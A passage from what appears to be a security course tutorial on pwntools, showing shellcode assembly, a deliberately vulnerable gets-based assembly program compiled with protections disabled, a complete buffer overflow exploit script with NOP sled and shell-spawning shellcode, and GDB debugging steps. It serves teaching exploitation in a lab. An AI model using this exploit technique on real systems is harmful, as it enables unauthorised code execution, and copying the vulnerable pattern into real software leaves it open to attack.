</span></span><span style=display:flex><span>    <span style=color:#000>li</span> <span style=color:#a40000>$</span><span style=color:#000>t9</span><span style=color:#000;font-weight:700>,</span> <span style=color:#ce5c00;font-weight:700>~</span><span style=color:#0000cf;font-weight:700>0x14</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>not</span> <span style=color:#a40000>$</span><span style=color:#000>a2</span><span style=color:#000;font-weight:700>,</span> <span style=color:#a40000>$</span><span style=color:#000>t9</span>
</span></span><span style=display:flex><span>    <span style=color:#000>li</span> <span style=color:#a40000>$</span><span style=color:#000>t9</span><span style=color:#000;font-weight:700>,</span> <span style=color:#ce5c00;font-weight:700>~</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>SYS_read</span><span style=color:#000;font-weight:700>)</span> <span style=color:#ce5c00;font-weight:700>/*</span> <span style=color:#0000cf;font-weight:700>0xfa3</span> <span style=color:#ce5c00;font-weight:700>*/</span>
</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>not</span> <span style=color:#a40000>$</span><span style=color:#000>v0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#a40000>$</span><span style=color:#000>t9</span>
</span></span><span style=display:flex><span>    <span style=color:#000>syscall</span> <span style=color:#0000cf;font-weight:700>0x40404</span>
</span></span></code></pre></div><p>These shellcodes can be directly assembled using asm inside your script, and given to the exploited process via the <code>send*</code> functions.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>  <span style=color:#000>shellcode</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>asm</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>       mov rdi, 0
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>       mov rax, 60
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>       syscall
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>&#39;&#39;&#39;</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>arch</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;amd64&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span></code></pre></div><blockquote><p>Most of the time you&rsquo;ll be working with as specific vulnerable program. To avoid specifing architecture for the asm function or to shellcraft you can define the context at the start of the script which will imply the architecture from the binary header.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#000>context</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>binary</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#39;./vuln_program&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>shellcode</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>asm</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>      mov rdi, 0
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>      mov rax, 60
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>      syscall
</span></span></span><span style=display:flex><span><span style=color:#4e9a06>&#39;&#39;&#39;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#204a87>print</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>shellcraft</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sh</span><span style=color:#000;font-weight:700>())</span>
</span></span></code></pre></div></blockquote><h2 id=gdb-integration>GDB integration</h2><hr><p>Most importantly, pwntools provides GDB integration, which is extremely useful.</p><p>Let&rsquo;s follow an example using the following program:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#000>extern</span> <span style=color:#000>gets</span>
</span></span><span style=display:flex><span><span style=color:#000>extern</span> <span style=color:#000>printf</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>section</span> <span style=color:#000>.data</span>
</span></span><span style=display:flex><span><span style=color:#f57900>formatstr:</span> <span style=color:#000>db</span> <span style=color:#a40000>&#34;</span><span style=color:#000>Enjoy</span> <span style=color:#000>your</span> <span style=color:#000>leak</span><span style=color:#000;font-weight:700>:</span> <span style=color:#000>%p</span><span style=color:#a40000>&#34;</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0xa</span><span style=color:#000;font-weight:700>,</span><span style=color:#0000cf;font-weight:700>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>section</span> <span style=color:#000>.text</span>
</span></span><span style=display:flex><span><span style=color:#000>global</span> <span style=color:#000>main</span>
</span></span><span style=display:flex><span><span style=color:#f57900>main:</span>
</span></span><span style=display:flex><span>	<span style=color:#000>push</span> <span style=color:#000>rbp</span>
</span></span><span style=display:flex><span>	<span style=color:#000>mov</span> <span style=color:#000>rbp</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>rsp</span>
</span></span><span style=display:flex><span>	<span style=color:#000>sub</span> <span style=color:#000>rsp</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>64</span>
</span></span><span style=display:flex><span>	<span style=color:#000>lea</span> <span style=color:#000>rbx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000;font-weight:700>[</span><span style=color:#000>rbp</span> <span style=color:#000;font-weight:700>-</span> <span style=color:#0000cf;font-weight:700>64</span><span style=color:#000;font-weight:700>]</span>
</span></span><span style=display:flex><span>	<span style=color:#000>mov</span> <span style=color:#000>rsi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>rbx</span>
</span></span><span style=display:flex><span>	<span style=color:#000>mov</span> <span style=color:#000>rdi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>formatstr</span>
</span></span><span style=display:flex><span>	<span style=color:#000>call</span> <span style=color:#000>printf</span>
</span></span><span style=display:flex><span>	<span style=color:#000>mov</span> <span style=color:#000>rdi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>rbx</span>
</span></span><span style=display:flex><span>	<span style=color:#000>call</span> <span style=color:#000>gets</span>
</span></span><span style=display:flex><span>	<span style=color:#000>leave</span>
</span></span><span style=display:flex><span>	<span style=color:#000>ret</span>
</span></span></code></pre></div><p>Compile it with:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nasm vuln.asm -felf64
</span></span><span style=display:flex><span>$ gcc -no-pie -fno-pic  -fno-stack-protector -z execstack vuln.o -o vuln
</span></span></code></pre></div><p>Use this script to exploit the program:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>from</span> <span style=color:#000>pwn</span> <span style=color:#204a87;font-weight:700>import</span> <span style=color:#ce5c00;font-weight:700>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>ret_offset</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>72</span>
</span></span><span style=display:flex><span><span style=color:#000>buf_addr</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#0000cf;font-weight:700>0x7fffffffd710</span>
</span></span><span style=display:flex><span><span style=color:#000>ret_address</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>buf_addr</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#000>ret_offset</span><span style=color:#ce5c00;font-weight:700>+</span><span style=color:#0000cf;font-weight:700>16</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># This sets several relevant things in the context (such as endianess,</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># architecture etc.), based on the given binary&#39;s properties.</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># We could also set them manually:</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># context.arch = &#34;amd64&#34;</span>
</span></span><span style=display:flex><span><span style=color:#000>context</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>binary</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>&#34;vuln&#34;</span>
</span></span><span style=display:flex><span><span style=color:#000>p</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>process</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;vuln&#34;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Garbage</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>ret_offset</span> <span style=color:#ce5c00;font-weight:700>*</span> <span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;A&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Overwrite ret_address, taking endianness into account</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>pack</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>ret_address</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Add nopsled</span>
</span></span><span style=display:flex><span><span style=color:#000>nops</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>asm</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;nop&#34;</span><span style=color:#000;font-weight:700>)</span><span style=color:#ce5c00;font-weight:700>*</span><span style=color:#0000cf;font-weight:700>100</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>nops</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Assemble a shellcode from &#39;shellcraft&#39; and append to payload</span>
</span></span><span style=display:flex><span><span style=color:#000>shellcode</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#000>asm</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>shellcraft</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sh</span><span style=color:#000;font-weight:700>())</span>
</span></span><span style=display:flex><span><span style=color:#000>payload</span> <span style=color:#ce5c00;font-weight:700>+=</span> <span style=color:#000>shellcode</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Attach to process</span>
</span></span><span style=display:flex><span><span style=color:#000>gdb</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>attach</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>p</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Wait for breakpoints, commands etc.</span>
</span></span><span style=display:flex><span><span style=color:#000>raw_input</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>&#34;Send payload?&#34;</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Send payload</span>
</span></span><span style=display:flex><span><span style=color:#000>p</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>sendline</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>payload</span><span style=color:#000;font-weight:700>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic># Enjoy shell :-)</span>
</span></span><span style=display:flex><span><span style=color:#000>p</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>interactive</span><span style=color:#000;font-weight:700>()</span>
</span></span></code></pre></div><p>Notice the <code>gdb.attach(p)</code> and raw_input lines. The former will open a new terminal window with GDB already attached. All of your GDB configurations will be used, so this works with PEDA as well. Let&rsquo;s set a breakpoint at the ret instruction from the main function:</p><pre tabindex=0><code class=language-gdb data-lang=gdb>gdb-peda$ pdis main
Dump of assembler code for function main:
   0x08048440 &lt;+0&gt;:	push   ebp
   0x08048441 &lt;+1&gt;:	mov    ebp,esp
   0x08048443 &lt;+3&gt;:	sub    esp,0x40
   0x08048446 &lt;+6&gt;:	lea    ebx,[ebp-0x40]
   0x08048449 &lt;+9&gt;:	push   ebx
   0x0804844a &lt;+10&gt;:	push   0x804a020
   0x0804844f &lt;+15&gt;:	call   0x8048300 &lt;printf@plt&gt;
   0x08048454 &lt;+20&gt;:	push   ebx
   0x08048455 &lt;+21&gt;:	call   0x8048310 &lt;gets@plt&gt;
   0x0804845a &lt;+26&gt;:	add    esp,0x4
   0x0804845d &lt;+29&gt;:	leave
   0x0804845e &lt;+30&gt;:	ret
   0x0804845f &lt;+31&gt;:	nop
End of assembler dump.
gdb-peda$ b *0x0804845e
Breakpoint 1 at 0x804845e
gdb-peda$ c
Continuing.
</code></pre><p>The continue command will return control to the terminal in which we&rsquo;re running the pwntools script. This is where the raw_input comes in handy, because it will wait for you to say “go” before proceeding further. Now if you hit <code>&lt;Enter></code> at the Send payload? prompt, you will notice that GDB has reached the breakpoint you&rsquo;ve previously set.</p><p>You can now single-step each instruction of the shellcode inside GDB to see that everything is working properly. Once you reach int <code>0x80</code>, you can continue again (or close GDB altogether) and interact with the newly spawned shell in the pwntools session.</p></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Discord aria-label=Discord><a class=text-white target=_blank rel=noopener href=https://bit.ly/DiscordSecuritySummerSchool aria-label=Discord><i class="fab fa-discord"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Facebook aria-label=Facebook><a class=text-white target=_blank rel=noopener href=https://www.facebook.com/SSSUPB/ aria-label=Facebook><i class="fab fa-facebook"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Youtube aria-label=Youtube><a class=text-white target=_blank rel=noopener href=https://bit.ly/YoutubeSecuritySummerSchool aria-label=Youtube><i class="fab fa-youtube"></i></a></li></ul></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/security-summer-school aria-label=GitHub><i class="fab fa-github"></i></a></li></ul></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2023 Open-Source Contributors. All Rights Reserved</small></div></div></div></footer></div><script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script>
<script src=https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js integrity="sha512-UR25UO94eTnCVwjbXozyeVd6ZqpaAE9naiEUBK/A+QDbfSTQFhPGj5lOR6d8tsgbBk84Ggb5A3EkjsOgPRPcKA==" crossorigin=anonymous></script>
<script src=/js/tabpane-persist.js></script>
<script src=/js/main.min.aa9f4c5dae6a98b2c46277f4c56f1673a2b000d1756ce4ffae93784cab25e6d5.js integrity="sha256-qp9MXa5qmLLEYnf0xW8Wc6KwANF1bOT/rpN4TKsl5tU=" crossorigin=anonymous></script></body></html>